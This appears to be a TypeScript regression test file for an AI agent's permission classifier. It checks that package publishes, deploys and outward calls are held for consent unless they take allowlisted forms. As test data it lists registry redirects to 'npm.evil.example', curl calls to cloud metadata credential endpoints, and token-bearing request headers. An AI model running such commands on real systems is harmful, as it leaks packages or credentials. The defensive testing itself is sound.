// Swarm 1.1.1 F33 (healing loop 14): publish and deploy open by a FORM allowlist, metadata endpoints are not local, the
// person's hosts are read without a file walk, and TOML is read without the Bun global (controller rulings P48, P49).
// One regression test per finding of gate 13 (security G13-1..G13-8, code review CR13-1..CR13-6, G13-P1); CR13-7 and
// CR13-8 are tested in `autonomy-bypass-gate.test.ts`. Classification only: no host is contacted, no command runs.

import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { $ } from "bun"
import { AutonomyTable } from "../../src/permission/autonomy-table"
import { OutwardConsent } from "../../src/permission/outward-consent"
import { OutwardKnown } from "../../src/permission/outward-known"
import { TomlReader } from "../../src/permission/toml-reader"
import type { InstanceContext } from "../../src/project/instance-context"
import { Risk } from "../../src/tool/risk"
import { readSteps } from "../../src/tool/shell"
import { ADMIN_RIGHTS, ARCHIVE_FIRST, CREDENTIAL_CHANGE, DELETE_COMPOUND, IRREVERSIBLE_ARCHIVE, OUTSIDE_WRITE, answerOf } from "./consented-literals"
import { tmpdir } from "../fixture/fixture"

type Input = AutonomyTable.Input
type Verdict = AutonomyTable.Verdict

const temps: Awaited<ReturnType<typeof tmpdir>>[] = []
const temp = async () => {
  const made = await tmpdir()
  temps.push(made)
  return fs.realpathSync(made.path)
}
const write = (root: string, relative: string, content: string) => {
  fs.mkdirSync(path.dirname(path.join(root, relative)), { recursive: true })
  fs.writeFileSync(path.join(root, relative), content)
}
async function gitInit(dir: string) {
  fs.mkdirSync(dir, { recursive: true })
  await $`git init -q`.cwd(dir).quiet()
  await $`git -c core.fsmonitor=false -c commit.gpgsign=false -c user.email=t@t.test -c user.name=T commit -q --allow-empty -m root`.cwd(dir).quiet()
}
const project = async (files: Record<string, string>) => {
  const dir = await temp()
  await gitInit(dir)
  for (const [name, content] of Object.entries(files)) write(dir, name, content)
  return dir
}
const scope = (dir: string) => ({ directory: dir, worktree: dir, project: { vcs: "git" } }) as InstanceContext
const npmProject = (extra: Record<string, unknown> = {}, files: Record<string, string> = {}) =>
  project({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", ...extra }), ...files })

async function sh(command: string, dir: string, outward?: AutonomyTable.Outward, cwd = dir): Promise<Input> {
  const reading = await readSteps(command, cwd)
  const risky = reading?.steps.map((step) => Risk.classify([...step.argv])).find((verdict) => verdict.kind === "risky")
  return {
    permission: "bash",
    patterns: [command],
    metadata: { command, ...(reading ? { steps: reading } : {}), ...(risky && risky.kind === "risky" ? { risk: risky.risk } : {}) },
    instance: scope(dir),
    cwd,
    canUndo: true,
    folder: "clean",
    ...(outward ? { outward } : {}),
  }
}

const base = (given: Input) => AutonomyTable.classify(given)
const root = (given: Input) => AutonomyTable.classify({ ...given, bypass: { caller: "root" } })
const subagent = (given: Input) => AutonomyTable.classify({ ...given, bypass: { caller: "subagent" } })
const short = (verdict: Verdict) => [verdict.class, verdict.category, verdict.destination]
const label = (given: Input) => String(given.metadata.command)

/** 1.1.3 (T9 G8): a literal consented verdict per case: class, category, `bypassed`, destination, and the agent's answer. */
type Want = { verdict: [string, string, string | undefined, string | undefined]; answer: string | undefined }
const RUNS = (bypassed: string, destination?: string): Want => ({ verdict: ["A", "by_main_agent", bypassed, destination], answer: undefined })
const REFUSED = (category: string, bypassed: string | undefined, answer: string): Want => ({ verdict: ["X", category, bypassed, undefined], answer })
function expectWant(label: string, verdict: Verdict, want: Want) {
  expect([label, verdict.class, verdict.category, verdict.bypassed, verdict.destination, answerOf(verdict)]).toEqual([label, ...want.verdict, want.answer])
}

function expectOpens(given: Input, destination: string) {
  expect([label(given), base(given).class === "A"]).toEqual([label(given), false])
  for (const verdict of [root(given), subagent(given)])
    expect([label(given), short(verdict)]).toEqual([label(given), ["A", "by_main_agent", destination]])
}
function expectNotOpen(given: Input, want: Want) {
  for (const verdict of [root(given), subagent(given)]) expectWant(label(given), verdict, want)
}
const named = (...hosts: string[]): AutonomyTable.Outward => ({ allowed: [], named: hosts.map((host) => ({ kind: "host", host })) })

let dir: string
const home = () => process.env.HOME || os.homedir()
// Files a test puts in the fixture home or the server environment, taken away after each test.
const placed: string[] = []
const envSet: string[] = []
const atHome = (relative: string, content: string) => {
  write(home(), relative, content)
  placed.push(path.join(home(), relative))
}
const setEnv = (key: string, value: string) => {
  process.env[key] = value
  envSet.push(key)
}

beforeAll(async () => {
  // The fixture home must be a test one: these tests write files into it.
  expect(path.resolve(home())).not.toBe(path.join("/Users", os.userInfo().username))
  dir = await npmProject()
})
afterEach(() => {
  for (const file of placed.splice(0)) fs.rmSync(file, { force: true })
  for (const key of envSet.splice(0)) delete process.env[key]
})
afterAll(async () => {
  for (const made of temps) await made[Symbol.asyncDispose]()
})

describe("P48: TOML is read without the Bun global", () => {
  test("the reader lists keys with their full path and gives up on what it cannot walk", () => {
    const found = TomlReader.entries(
      [
        "# a comment with registry in it",
        "[package]",
        'name = "x" # trailing',
        "features = [",
        '  "a", # one',
        "  'b',",
        "]",
        'meta = { registry = "corp", "a.b" = 1 }',
        "[[bin]]",
        'name = "x"',
        '[registries."my.corp"]',
        'index = """',
        'sparse+https://x.test/"""',
      ].join("\n"),
    )
    // 1.1.1 F36 (G14-7): table headers are listed too, marked `table`.
    const keys = found?.filter((entry) => !entry.table)
    expect(keys?.map((entry) => entry.path.join("/"))).toEqual(["package/name", "package/features", "package/meta", "bin/name", "registries/my.corp/index"])
    expect(found?.filter((entry) => entry.table).map((entry) => entry.path.join("/"))).toEqual(["package", "bin", "registries/my.corp"])
    expect(TomlReader.strings(keys![1]!.raw)).toEqual(["a", "b"])
    expect(TomlReader.string('"a\\u0062"')).toBe("ab")
    for (const broken of ['[a\nb = 1', 'a = "open', "a = [1, 2", "a = 1 b = 2", "= 1", 'a = "x"\n[b', "d = 1979-05-27 07:32:00"])
      expect([broken, TomlReader.entries(broken)]).toEqual([broken, undefined])
  })

  test("outward-consent no longer calls Bun.TOML", () => {
    const source = fs.readFileSync(path.join(import.meta.dir, "../../src/permission/outward-consent.ts"), "utf8")
    expect(source.includes("Bun.TOML")).toBe(false)
    expect(fs.readFileSync(path.join(import.meta.dir, "../../src/permission/toml-reader.ts"), "utf8").includes("Bun.")).toBe(false)
  })

  test("a TOML file the reader cannot walk holds the publish", async () => {
    const crate = await project({ "Cargo.toml": '[package]\nname = "x"\nversion = "0.1.0"\n' })
    expectOpens(await sh("cargo publish", crate), "crates.io")
    write(crate, ".cargo/config.toml", "[registry\ndefault = 'x'\n")
    expectNotOpen(await sh("cargo publish", crate), RUNS("outward"))
    // 1.1.1 F36 (P52): a cargo config file holds by being there, whatever it says.
    write(crate, ".cargo/config.toml", "# no registry here\n[net]\nretry = 2\n")
    expectNotOpen(await sh("cargo publish", crate), RUNS("outward"))
    fs.rmSync(path.join(crate, ".cargo/config.toml"))
    expectOpens(await sh("cargo publish", crate), "crates.io")
  })
})

describe("CR13-1 / P49 3: a publish names no folder, tarball or package", () => {
  test("a folder's own publish hook is never run unread", async () => {
    const here = await npmProject({}, { "hk/package.json": JSON.stringify({ name: "hk", version: "1.0.0", scripts: { prepublishOnly: "node x.js" } }) })
    for (const command of ["npm publish ./hk", "npm publish hk/", "npm publish x.tgz", "npm publish .", "npm publish p@1.0.0", "pnpm publish hk", "bun publish ./hk", "yarn npm publish hk"])
      expectNotOpen(await sh(command, here), RUNS("outward"))
    // Run in the folder: it is not the project's top, so it holds too.
    expectNotOpen(await sh("npm publish", here, undefined, path.join(here, "hk")), RUNS("outward"))
    expectNotOpen(await sh("cd hk && npm publish", here), RUNS("outward"))
    expectOpens(await sh("npm publish", here), "registry.npmjs.org")
  })
})

describe("G13-1 / CR13-2: npm-family options and configuration", () => {
  test("options that move the registry, the config or the package hold in every spelling", async () => {
    for (const command of [
      "npm publish --userconfig ./evil.npmrc",
      "npm publish --userc=./evil.npmrc",
      "npm publish --reg https://npm.evil.example/",
      "npm publish --registry=https://registry.npmjs.org/",
      "npm publish --@acme:registry=https://npm.evil.example/",
      "npm publish --globalconfig ./g",
      "npm publish --workspace a",
      "npm publish --workspaces",
      "npm publish -w a",
      "npm publish --prefix sub",
      "npm publish --tag --registry",
      "npm publish --tag",
      "npm publish -- --tag next",
      "npm --registry=https://npm.evil.example/ publish",
      "pnpm -r publish",
      "pnpm publish -r",
      "pnpm publish --recursive",
      "pnpm publish --filter a",
      "pnpm publish --dir sub",
      "bun publish --cwd sub",
      "yarn npm publish --registry https://npm.evil.example/",
    ])
      expectNotOpen(await sh(command, dir), RUNS("outward"))
    expectOpens(await sh("npm publish --access public --tag next", dir), "registry.npmjs.org")
    expectOpens(await sh("npm publish --dry-run --provenance --otp=123456", dir), "registry.npmjs.org")
    expectOpens(await sh("pnpm publish --no-git-checks --access public", dir), "registry.npmjs.org")
    expectOpens(await sh("yarn npm publish --tolerate-republish", dir), "registry.npmjs.org")
  })

  test("a registry line anywhere npm, pnpm, yarn or bun read one holds; other lines do not", async () => {
    const here = await npmProject()
    expectOpens(await sh("npm publish", here), "registry.npmjs.org")
    atHome(".npmrc", "registry=https://npm.evil.example/\n")
    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
    // 1.1.1 F39 (V15-1, P54): a user npmrc of only allowlisted lines (a default-registry token, a neutral key) opens.
    atHome(".npmrc", "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\nsave-exact=true\n")
    expectOpens(await sh("npm publish", here), "registry.npmjs.org")
    atHome(".npmrc", "@acme:registry=https://npm.evil.example/\n")
    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
    atHome(".npmrc", "[section]\nx=1\n")
    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
    fs.rmSync(path.join(home(), ".npmrc"))
    // A user config elsewhere, named by the environment npm gives its scripts.
    write(here, "elsewhere/u.npmrc", "registry=https://npm.evil.example/\n")
    setEnv("npm_config_userconfig", path.join(here, "elsewhere/u.npmrc"))
    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
    delete process.env.npm_config_userconfig
    // A global config by its prefix in the user's file.
    write(here, "prefix/etc/npmrc", "registry=https://npm.evil.example/\n")
    atHome(".npmrc", `prefix=${path.join(here, "prefix")}\n`)
    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
    fs.rmSync(path.join(home(), ".npmrc"))
    setEnv("npm_config_registry", "https://npm.evil.example/")
    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
    delete process.env.npm_config_registry
    setEnv("NPM_CONFIG_@ACME:REGISTRY", "https://npm.evil.example/")
    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
    delete process.env["NPM_CONFIG_@ACME:REGISTRY"]
    atHome(".yarnrc.yml", "npmScopes:\n  acme:\n    npmRegistryServer: https://npm.evil.example/\n")
    expectNotOpen(await sh("yarn npm publish", here), RUNS("outward"))
    fs.rmSync(path.join(home(), ".yarnrc.yml"))
    atHome(".bunfig.toml", '[install.scopes]\nacme = "https://npm.evil.example/"\n')
    expectNotOpen(await sh("bun publish", here), RUNS("outward"))
    fs.rmSync(path.join(home(), ".bunfig.toml"))
    expectOpens(await sh("npm publish", here), "registry.npmjs.org")
  })

  test("publishConfig with any key holds (1.1.1 F36, P52)", async () => {
    expectOpens(await sh("npm publish", await npmProject({ publishConfig: {} })), "registry.npmjs.org")
    for (const config of [{ access: "public", tag: "next", provenance: true }, { registry: "https://registry.npmjs.org/" }, { "@acme:registry": "x" }, { directory: "dist" }, { userconfig: "x" }, "x"])
      expectNotOpen(await sh("npm publish", await npmProject({ publishConfig: config })), RUNS("outward"))
  })

  test("a registry the person named does not open a publish any more", async () => {
    expectNotOpen(await sh("npm publish --registry https://npm.named.com/", dir, named("npm.named.com")), RUNS("outward"))
    expectNotOpen(await sh("npm publish", await npmProject({}, { ".npmrc": "registry=https://npm.named.com/\n" }), named("npm.named.com")), RUNS("outward"))
  })
})

describe("G13-2 / CR13-2: cargo options, configuration and manifest", () => {
  const crate = (manifest = '[package]\nname = "x"\nversion = "0.1.0"\n', files: Record<string, string> = {}) =>
    project({ "Cargo.toml": manifest, ...files })

  test("options that move the registry, the config or the package hold", async () => {
    const here = await crate()
    for (const [command, want] of [
      ["cargo publish --config registry.default=evil", RUNS("outward")],
      ["cargo publish --config ./evil.toml", RUNS("outward")],
      ["cargo publish --manifest-path other/Cargo.toml", RUNS("outward")],
      ["cargo publish -p other", RUNS("outward")],
      ["cargo publish --package other", RUNS("outward")],
      ["cargo publish --registry crates-io", RUNS("outward")],
      ["cargo publish --index sparse+https://x.test/", RUNS("outward")],
      ["cargo publish -Z unstable-options", RUNS("outward")],
      ["cargo publish --workspace", RUNS("outward")],
      ["cargo +nightly publish", RUNS("not_routine")],
      ["cargo publish --token abc", RUNS("outward")],
    ] as [string, Want][])
      expectNotOpen(await sh(command, here), want)
    expectOpens(await sh("cargo publish --dry-run", here), "crates.io")
    expectOpens(await sh("cargo publish --allow-dirty --no-verify --locked", here), "crates.io")
  })

  test("the root manifest: a package, no workspace, publish only to crates.io", async () => {
    expectOpens(await sh("cargo publish", await crate('[package]\nname = "x"\nversion = "0.1.0"\n[dependencies]\nserde = { version = "1", features = [\n  "derive",\n] }\n')), "crates.io")
    for (const manifest of [
      // 1.1.1 F38: a `publish` key in [package] holds unless it is `publish = true`.
      '[package]\nname = "x"\nversion = "0.1.0"\npublish = ["crates-io"]\n',
      '[workspace]\nmembers = ["a"]\n',
      '[package]\nname = "x"\n[workspace]\nmembers = ["a"]\n',
      '[package]\nname = "x"\npublish = ["corp"]\n',
      '[package]\nname = "x"\npublish = ["crates-io", "corp"]\n',
      '[package]\nname = "x"\npublish.workspace = true\n',
      'package = { name = "x" }\n',
      '[package\nname = "x"\n',
    ])
      expectNotOpen(await sh("cargo publish", await crate(manifest)), RUNS("outward"))
    // No manifest in the top folder, or run below it.
    expectNotOpen(await sh("cargo publish", dir), RUNS("outward"))
    const nested = await crate(undefined, { "sub/Cargo.toml": '[package]\nname = "y"\n' })
    expectNotOpen(await sh("cd sub && cargo publish", nested), RUNS("outward"))
  })

  test("cargo config from the folder up and in CARGO_HOME, and the environment", async () => {
    const here = await crate()
    for (const config of ['[registry]\ndefault = "corp"\n', 'registry.default = "corp"\n', '[source.crates-io]\nreplace-with = "mirror"\n', '[registries.corp]\nindex = "x"\n', 'include = "other.toml"\n'])
      expectNotOpen(await sh("cargo publish", await crate(undefined, { ".cargo/config.toml": config })), RUNS("outward"))
    // 1.1.1 F36 (P52): a config file with credentials only holds as well.
    expectNotOpen(await sh("cargo publish", await crate(undefined, { ".cargo/config.toml": '[registry]\nglobal-credential-providers = ["cargo:token"]\n' })), RUNS("outward"))
    atHome(".cargo/config.toml", '[registry]\ndefault = "corp"\n')
    expectNotOpen(await sh("cargo publish", here), RUNS("outward"))
    fs.rmSync(path.join(home(), ".cargo/config.toml"))
    setEnv("CARGO_REGISTRY_DEFAULT", "corp")
    expectNotOpen(await sh("cargo publish", here), RUNS("outward"))
    delete process.env.CARGO_REGISTRY_DEFAULT
    // 1.1.1 F36 (P52): every CARGO_REGISTR* variable holds; 1.1.1 F39 (V15-3, P54) but the crates.io token.
    setEnv("CARGO_REGISTRY_CREDENTIAL_PROVIDER", "x")
    expectNotOpen(await sh("cargo publish", here), RUNS("outward"))
    delete process.env.CARGO_REGISTRY_CREDENTIAL_PROVIDER
    setEnv("CARGO_REGISTRY_TOKEN", "x")
    expectOpens(await sh("cargo publish", here), "crates.io")
  })
})

describe("P49 3: poetry, uv and twine forms", () => {
  const python = (pyproject = '[project]\nname = "x"\nversion = "0.1.0"\ndependencies = [\n  "requests",\n]\n', files: Record<string, string> = {}) =>
    project({ "pyproject.toml": pyproject, ...files })

  test("poetry and uv open plain from the root manifest", async () => {
    const here = await python()
    expectOpens(await sh("poetry publish --build", here), "pypi.org")
    expectOpens(await sh("uv publish --dry-run", here), "pypi.org")
    for (const command of ["poetry publish -r test", "poetry publish --repository test", "poetry publish --repo test", "poetry publish --dist-dir out", "uv publish --publish-url https://x.test/", "uv publish --index corp", "uv publish dist/x.whl", "uv publish --check-url https://x.test/"])
      expectNotOpen(await sh(command, here), RUNS("outward"))
    expectNotOpen(await sh("poetry publish", dir), RUNS("outward"))
  })

  test("a registry setting in pyproject, uv.toml or poetry's config holds", async () => {
    for (const [tool, pyproject] of [
      ["uv", '[project]\nname = "x"\n[tool.uv]\npublish-url = "https://x.test/"\n'],
      ["uv", '[project]\nname = "x"\n[[tool.uv.index]]\nname = "corp"\nurl = "https://x.test/"\npublish-url = "https://x.test/up"\n'],
      ["poetry", '[tool.poetry]\nname = "x"\n[[tool.poetry.source]]\nname = "corp"\nurl = "https://x.test/"\n'],
      ["uv", '[project]\nname = "x"\n[tool.uv\nindex-url = "https://x.test/"\n'],
    ] as const)
      expectNotOpen(await sh(`${tool} publish`, await python(pyproject)), RUNS("outward"))
    expectNotOpen(await sh("uv publish", await python(undefined, { "uv.toml": 'publish-url = "https://x.test/"\n' })), RUNS("outward"))
    expectNotOpen(await sh("poetry publish", await python(undefined, { "poetry.toml": '[repositories.corp]\nurl = "https://x.test/"\n' })), RUNS("outward"))
    const here = await python()
    setEnv("UV_PUBLISH_URL", "https://x.test/")
    expectNotOpen(await sh("uv publish", here), RUNS("outward"))
    delete process.env.UV_PUBLISH_URL
    expectOpens(await sh("uv publish", here), "pypi.org")
  })

  test("twine: dist files inside the project and no option (G13-6)", async () => {
    const here = await python(undefined, { "dist/x.whl": "w" })
    expectOpens(await sh("twine upload dist/x.whl", here), "pypi.org")
    for (const command of [
      "twine upload --repository-u https://x.test/ dist/x.whl",
      "twine upload --repo corp dist/x.whl",
      "twine upload --skip-existing dist/x.whl",
      "twine upload -r pypi dist/x.whl",
      "twine upload build/x.whl",
      "twine upload ../x.whl",
      "twine upload dist/../../x.whl",
      "twine upload",
    ])
      expectNotOpen(await sh(command, here), RUNS("outward"))
    atHome(".pypirc", "[pypi]\nrepository = https://x.test/\n")
    expectNotOpen(await sh("twine upload dist/x.whl", here), RUNS("outward"))
    fs.rmSync(path.join(home(), ".pypirc"))
    setEnv("TWINE_REPOSITORY", "pypi")
    expectNotOpen(await sh("twine upload dist/x.whl", here), RUNS("outward"))
  })
})

describe("CR13-4 / G13-5: netlify opens only with --no-build, a --dir inside, and a plain netlify.toml", () => {
  test("the form", async () => {
    const here = await project({ "dist/index.html": "x" })
    expectOpens(await sh("netlify deploy --no-build --dir dist", here), "netlify")
    expectOpens(await sh("netlify deploy --prod --no-build --dir=dist -m release", here), "netlify")
    for (const command of [
      "netlify deploy --no-build",
      "netlify deploy --dir dist",
      "netlify deploy --no-build --dir ../",
      "netlify deploy --no-build --dir /tmp",
      "netlify deploy --no-build --dir dist --functions fn",
      "netlify deploy --no-build --dir dist --site other",
      "netlify deploy --no-build --dir dist --dir other",
      "netlify deploy --no-build --dir dist extra",
    ])
      expectNotOpen(await sh(command, here), RUNS("outward"))
  })

  test("base and contexts move the folders; functions folders must land inside", async () => {
    const command = "netlify deploy --prod --no-build --dir dist"
    for (const toml of [
      '[build]\nbase = "../.."\npublish = "x"\n',
      '[context.production]\npublish = "../../"\n',
      '[context.deploy-preview.environment]\nX = "1"\n',
      '[functions]\ndirectory = "../fn"\n',
      '[build]\nfunctions = "../fn"\n',
      '[functions]\nincluded_files = ["../secret/**"]\n',
      'build = { publish = "dist" }\n',
      '[build\npublish = "dist"\n',
    ])
      expectNotOpen(await sh(command, await project({ "netlify.toml": toml })), RUNS("outward"))
    // 1.1.1 F36 (P52, CR14-2): only a [build] table with a plain publish opens.
    expectNotOpen(await sh(command, await project({ "netlify.toml": '[build]\npublish = "dist"\ncommand = "make"\n[functions]\ndirectory = "fn"\n' })), RUNS("outward"))
    expectOpens(await sh(command, await project({ "netlify.toml": '[build]\npublish = "dist"\n' })), "netlify")
  })
})

describe("G13-4 / G13-8 / P49 3: firebase opens only for hosting", () => {
  test("the form", async () => {
    const here = await project({ "firebase.json": JSON.stringify({ hosting: { public: "dist" } }) })
    expectOpens(await sh("firebase deploy --only hosting", here), "firebase")
    expectOpens(await sh("firebase deploy --only hosting:site-a,hosting:site-b --project demo", here), "firebase demo")
    for (const command of ["firebase deploy", "firebase deploy --only functions", "firebase deploy --only hosting,functions", "firebase deploy --except functions", "firebase deploy --only hosting --only functions", "firebase deploy --only hosting extra"])
      expectNotOpen(await sh(command, here), RUNS("outward"))
  })

  test("functions, remote config and framework sources hold; hosting rewrites do not", async () => {
    for (const config of [
      { hosting: { public: "dist" }, functions: { source: "fn" } },
      { hosting: { public: "dist" }, remoteconfig: { template: "../outside.json" } },
      { hosting: { source: "." } },
      { hosting: [{ target: "a", public: "dist" }, { target: "b", source: "app", frameworksBackend: { region: "x" } }] },
    ])
      expectNotOpen(await sh("firebase deploy --only hosting", await project({ "firebase.json": JSON.stringify(config) })), RUNS("outward"))
    const rewrites = { hosting: { public: "dist", rewrites: [{ source: "/api/**", function: "api" }] } }
    expectOpens(await sh("firebase deploy --only hosting", await project({ "firebase.json": JSON.stringify(rewrites) })), "firebase")
  })
})

describe("CR13-3 / P49 1: cloud metadata endpoints are not local", () => {
  test("every link-local IPv4 address, fd00:ec2::/32 and the metadata short names", async () => {
    for (const [command, want] of [
      ["curl -s -H 'Metadata-Flavor: Google' http://metadata/computeMetadata/v1/", RUNS("outward", "metadata")],
      ["curl -s http://169.254.170.2/v2/credentials/x", RUNS("outward", "169.254.170.2")],
      ["curl -s http://169.254.170.23/v1/credentials", RUNS("outward", "169.254.170.23")],
      ["curl -s 'http://[fd00:ec2::23]/'", RUNS("outward", "fd00:ec2::23")],
      ["curl -s http://instance-data/latest/meta-data/", RUNS("outward", "instance-data")],
      ["curl -s http://METADATA./x", RUNS("outward", "metadata")],
      ["curl -s http://169.254.1.1/", RUNS("outward", "169.254.1.1")],
      ["curl -s 'http://[::ffff:169.254.170.2]/'", RUNS("outward", "::ffff:a9fe:aa02")],
    ] as [string, Want][])
      expectNotOpen(await sh(command, dir), want)
    for (const host of ["metadata", "instance-data", "169.254.0.1", "169.254.255.255", "fd00:ec2::1", "fd00:ec2:ffff::1"])
      expect([host, OutwardConsent.localHost(host)]).toEqual([host, false])
    expectOpens(await sh("curl -s http://db:5432/", dir), "db:5432")
    expectOpens(await sh("curl -s http://metadata-api:8080/", dir), "metadata-api:8080")
    expect(OutwardConsent.localHost("fd00:ec3::1")).toBe(true)
  })
})

describe("CR13-5 / G13-3: an httpie or xh item value does not start with an expansion", () => {
  test("held at the start, open after a literal character", async () => {
    for (const command of ['http localhost:3000/x "Authorization:$TOKEN"', 'http localhost:3000/x "f=$DATA"', 'xh POST localhost:3000/x "j:=$DATA"', 'http localhost:3000/x "q==$Q"'])
      expectNotOpen(await sh(command, dir), RUNS("outward", "localhost:3000"))
    expectOpens(await sh('http localhost:3000/x "Authorization:Bearer $TOKEN"', dir), "localhost:3000")
    expectOpens(await sh('http localhost:3000/x "f=v$DATA"', dir), "localhost:3000")
  })
})

describe("CR13-6 / G13-P1 / P49 4: the person's hosts come from URLs and web endings, with no file walk", () => {
  test("bare names count by their last label only", () => {
    expect(OutwardKnown.personHosts("deploy to api.example.com and docs.acme.io")).toEqual(["api.example.com", "docs.acme.io"])
    expect(OutwardKnown.personHosts("rebuild Swarm.app, run install.sh, open logo.ai, read notes.md")).toEqual([])
    expect(OutwardKnown.personHosts("fetch https://install.sh/latest and https://logo.ai/x")).toEqual(["install.sh", "logo.ai"])
    expect(OutwardKnown.personHosts("calls to *.acme.dev are fine")).toEqual(["*.acme.dev"])
    for (const ending of ["sh", "app", "ai"]) expect([ending, OutwardKnown.WEB_TLDS.has(ending)]).toEqual([ending, false])
    for (const ending of ["com", "org", "net", "io", "dev"]) expect([ending, OutwardKnown.WEB_TLDS.has(ending)]).toEqual([ending, true])
  })

  test("the project file walk is gone", () => {
    expect(Object.keys(OutwardKnown)).not.toContain("fileNames")
    const source = fs.readFileSync(path.join(import.meta.dir, "../../src/permission/autonomy.ts"), "utf8")
    expect(source.includes("fileNames")).toBe(false)
  })
})
